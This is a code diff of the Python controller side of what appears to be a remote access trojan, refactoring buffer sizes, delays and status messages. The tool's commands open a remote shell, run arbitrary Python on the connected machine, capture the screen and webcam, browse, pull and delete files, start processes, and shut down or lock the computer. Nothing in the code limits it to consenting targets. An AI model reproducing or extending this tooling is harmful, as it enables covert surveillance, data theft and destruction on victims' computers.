@@ -7,6 +7,8 @@ PORT = 3000
 # Defines (Send & Recv) Functions for use
 send = lambda data: conn.send(data)
 recv = lambda buffer: conn.recv(buffer)
+bufsize = 1024
+delay = 0.2
 
 os.system("clear" if os.name == "posix" else "cls")
 
@@ -28,7 +30,7 @@ def main():
     while (True):
         try:
             conn, address = objSocket.accept()
-            ClientInfo = recv(1024).decode().split()
+            ClientInfo = recv(bufsize).decode().split()
 
             print(f"Computer Connected: ({ClientInfo[0]}) ({ClientInfo[1]})\n")
             return
@@ -81,30 +83,34 @@ def OpenWebpage():
         print("(Bad URL, use: http/https)\n")
         return
 
-    send(b"open-webpage"); send(url.encode())
-    print(recv(1024).decode() + "\n")
+    send(b"open-webpage"); time.sleep(delay); send(url.encode())
+    print(recv(bufsize).decode() + "\n")
 
 def Screenshot(current_time):
-    if not (recv(1024).decode() == "success"):
+    send(b"capture-screenshot")
+
+    if not (recv(bufsize).decode() == "success"):
         print("(Error Capturing Screen)\n")
         return
 
-    buffersize = recv(1024).decode()
+    buffersize = recv(bufsize).decode()
     with open(f"screenshot{current_time}.png", "wb") as ImageFile:
         ImageFile.write(recvall(int(buffersize)))
 
-    print("\n(Screenshot Captured)\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
+    print("\n[+] Screenshot Captured\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
 
 def Webcam(current_time):
-    if not (recv(1024).decode() == "success"):
+    send(b"capture-webcam")
+
+    if not (recv(bufsize).decode() == "success"):
         print("(No Webcam Detected)\n")
         return
 
-    buffersize = recv(1024).decode(); Webcam_Name = recv(1024).decode()
+    buffersize = recv(bufsize).decode(); Webcam_Name = recv(bufsize).decode()
     with open(f"webcam{current_time}.png", "wb") as ImageFile:
         ImageFile.write(recvall(int(buffersize)))
 
-    print("\n[ Webcam Captured ]\n\n" + f"Name: ({Webcam_Name})\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
+    print("\n[+] Webcam Captured\n" + f"Camera Name: ({Webcam_Name})\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
 
 def SystemInformation():
     print(f"\nComputer: ({ClientInfo[1]})")
@@ -114,14 +120,16 @@ def SystemInformation():
     print(f"Public IP: ({ClientInfo[5]})\n")
 
 def StartProcess():
-    FileLocation = input("\nRemote File Location: "); send(FileLocation.encode()); ClientResponse = recv(1024).decode()
+    FileLocation = input("\nRemote File Location: "); send(b"start-process"); time.sleep(delay); send(FileLocation.encode()); ClientResponse = recv(bufsize).decode()
     if not (ClientResponse == "VALID"):
-        print("(Non-Existing File)\n")
+        print("(Cannot Find Remote File)\n")
         return
 
     print(f"Status: (Process Running)\n")
 
 def PythonInterpreter():
+    send(b"python-interpreter")
+
     with open("code.txt", "w") as CodeFile:
         CodeFile.close()
 
@@ -138,12 +146,12 @@ def PythonInterpreter():
     with open("code.txt", "rb") as SendCodeFile:
         send(SendCodeFile.read())
 
-    ClientResponse = recv(1024).decode()
+    ClientResponse = recv(bufsize).decode()
     if not (ClientResponse == "SUCCESS"):
         print(ClientResponse + "\n"); os.remove("code.txt")
         return
 
-    ClientOutput = recv(1024).decode(); SplitOutput = ClientOutput.split("<")
+    ClientOutput = recv(bufsize).decode(); SplitOutput = ClientOutput.split("<")
     if (SplitOutput[0] == ""):
         print("\n[Remote Machine Output]\n" + "-"*23 + "\n<No Output>\n")
     else:
@@ -152,7 +160,9 @@ def PythonInterpreter():
     os.remove("code.txt")
 
 def RemoteCMD():
-    CurrentRemoteDirectory = recv(1024).decode()
+    send(b"remote-cmd")
+
+    CurrentRemoteDirectory = recv(bufsize).decode()
     print("(Remote CMD Active)\n\n", end="")
 
     while (True):
@@ -169,63 +179,67 @@ def RemoteCMD():
 
         elif (len(CMD_Command) > 0):
             send(CMD_Command.encode())
-            print(recv(4096).decode(), end="")
+            print(recv(bufsize).decode(), end="")
         else:
             print(CurrentRemoteDirectory, end="")
 
 def ViewFiles():
-    print(f"Available Drives: ({recv(1024).decode()})\n")
-    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(1024).decode()
+    send(b"view-files")
+
+    print(f"Available Drives: ({recv(bufsize).decode()})\n")
+    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(bufsize).decode()
     if not (ClientResponse == "VALID"):
-        print("(Non-Existing Directory)\n")
+        print("(Remote Directory Not Found)\n")
         return
 
-    Number_Of_Files = recv(1024).decode()
-    buffersize = int(recv(1024).decode())
+    Number_Of_Files = recv(bufsize).decode()
+    buffersize = int(recv(bufsize).decode())
     files = recvall(buffersize).decode()
 
-    print(f"Files - [{Number_Of_Files}]\n"); print(files + "\n")
+    print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{buffersize}]\n\n{files}\n")
 
 def SendFile():
     FilePath = input("\nEnter File Path: ")
     if not (os.path.isfile(FilePath)):
-        print("(Non-Existent File)\n"); return
+        print("(File Not Found)\n"); return
 
-    send(b"send-file"); time.sleep(0.2); send(os.path.basename(FilePath).encode()); time.sleep(0.2); send(str(os.path.getsize(FilePath)).encode())
+    send(b"send-file"); time.sleep(delay); send(os.path.basename(FilePath).encode()); time.sleep(delay); send(str(os.path.getsize(FilePath)).encode())
     with open(FilePath, "rb") as file:
         send(file.read())
 
-    print(recv(1024).decode() + "\n")
+    print(recv(bufsize).decode() + "\n")
 
 def ReceiveFile():
-    RemotePath = input("\nRemote File Path: "); send(RemotePath.encode()); ClientResponse = recv(1024).decode()
+    RemotePath = input("\nRemote File Path: "); send(RemotePath.encode()); ClientResponse = recv(bufsize).decode()
     if not (ClientResponse == "success"):
-        print("(Non-Existing File)\n")
+        print("(Remote File Not Found)\n")
         return
 
-    filename = recv(1024).decode(); buffersize = int(recv(1024).decode())
+    filename = recv(bufsize).decode(); buffersize = int(recv(bufsize).decode())
     with open(filename, "wb") as file:
         file.write(recvall(buffersize))
 
-    print("(File Received)\n")
+    print(f"\n[+] File Received\nFile Name: [{filename}]\nTotal Size: [{buffersize} Bytes]\n")
 
 def Delete():
+    send(b"delete")
+
     choice = input("\nDelete File/Directory? (f/d): ").lower()
     if (choice == "f"):
-        send(b"del-file"); file = input("Remote File Path: "); send(file.encode()); ClientResponse = recv(1024).decode()
+        send(b"del-file"); file = input("Remote File Path: "); send(file.encode()); ClientResponse = recv(bufsize).decode()
         if not (ClientResponse == "success"):
-            print("(Non-Existent File)\n")
+            print("(Remote File Not Found)\n")
             return
 
-        print("(File Deleted)\n")
+        print("(Remote File Deleted)\n")
 
     elif (choice == "d"):
-        send(b"del-dir"); directory = input("Remote Directory: "); input("\n[Enter to Delete]"); send(directory.encode()); ClientResponse = recv(1024).decode()
+        send(b"del-dir"); directory = input("Remote Directory: "); input("\n[Press Enter to Delete]"); send(directory.encode()); ClientResponse = recv(bufsize).decode()
         if not (ClientResponse == "success"):
-            print("(Non-Existent Directory)\n")
+            print("(Remote Directory Not Found)\n")
             return
 
-        print("(Directory Deleted)\n")
+        print("(Remote Directory Deleted)\n")
 
     else:
         send(b"error"); print("Invalid Choice, Returning...\n")
@@ -236,52 +250,68 @@ def RemoteCommands():
             command = input(f"({ClientInfo[0]})> ").lower().strip()
             if (command == "help" or command == "?"):
                 UsableCommands()
+
             elif (command == "clear" or command == "cls"):
                 os.system("clear" if os.name == "posix" else "cls")
+
             elif (command == "-tc"):
-                send(b"close-connection"); print(f"Terminated Connection: ({ClientInfo[0]})\n"); conn.close(); break
+                send(b"close-connection"); print(f"(Terminated Connection)\n"); conn.close(); break
+
             elif (command == "-ac"):
-                send(b"append-connection"); print(f"Appended Connection: ({ClientInfo[0]})\n"); conn.close(); break
+                send(b"append-connection"); print(f"(Appended Connection)\n"); conn.close(); break
+
             elif (command == "-sm"):
-                message = input("\nType Message: "); send(b"message-box"); send(message.encode()); print(recv(1024).decode() + "\n")
+                message = input("\nType Message: "); send(b"message-box"); time.sleep(delay); send(message.encode()); print(recv(bufsize).decode() + "\n")
+
             elif (command == "-ow"):
                 OpenWebpage()
+
             elif (command == "-ss"):
-                send(b"capture-screenshot"); Screenshot("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
+                Screenshot("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
+
             elif (command == "-cw"):
-                send(b"capture-webcam"); Webcam("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
+                Webcam("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
+
             elif (command == "-si"):
-                send(b"test"); SystemInformation()
+                SystemInformation()
+
             elif (command == "-sp"):
-                send(b"start-process"); StartProcess()
+                StartProcess()
+
             elif (command == "-pi"):
-                send(b"python-interpreter"); PythonInterpreter()
+                PythonInterpreter()
+
             elif (command == "-rs"):
-                send(b"remote-cmd"); RemoteCMD()
+                RemoteCMD()
+
             elif (command == "-sc"):
-                send(b"shutdown-pc"); print(f"Status: ({recv(1024).decode()})\n")
+                send(b"shutdown-pc"); print(f"Status: ({recv(bufsize).decode()})\n")
+
             elif (command == "-rc"):
-                send(b"restart-pc"); print(f"Status: ({recv(1024).decode()})\n")
+                send(b"restart-pc"); print(f"Status: ({recv(bufsize).decode()})\n")
+
             elif (command == "-lc"):
-                send(b"lock-pc"); print(f"Status: ({recv(1024).decode()})\n")
+                send(b"lock-pc"); print(f"Status: ({recv(bufsize).decode()})\n")
+
             elif (command == "-cd"):
-                send(b"current-dir"); print(recv(1024).decode() + "\n")
+                send(b"current-dir"); print(recv(bufsize).decode() + "\n")
+
             elif (command == "-vf"):
-                send(b"view-files"); ViewFiles()
+                ViewFiles()
+
             elif (command == "-sf"):
                 SendFile()
+
             elif (command == "-rf"):
                 send(b"receive-file"); ReceiveFile()
+
             elif (command == "-dl"):
-                send(b"delete"); Delete()
+                Delete()
             else:
                 print(f"Unrecognized Command: ({command})\n")
 
         except KeyboardInterrupt:
             send(b"append-connection"); print("\n(Keyboard Interrupted, Connection Appended)\n"); exit(0)
-
-        except ConnectionAbortedError as e: # Client timeouts after 3 minute period
-            print("\n[-] No Commands were sent within 3 minutes, Connection Appended\n" + f"Error Message: {e}\n"); exit(1)
 
         except (socket.error, Exception) as e:
             print(f"\n[-] Lost Connection to ({ClientInfo[0]})\n" + f"Error Message: {e}\n"); exit(1)
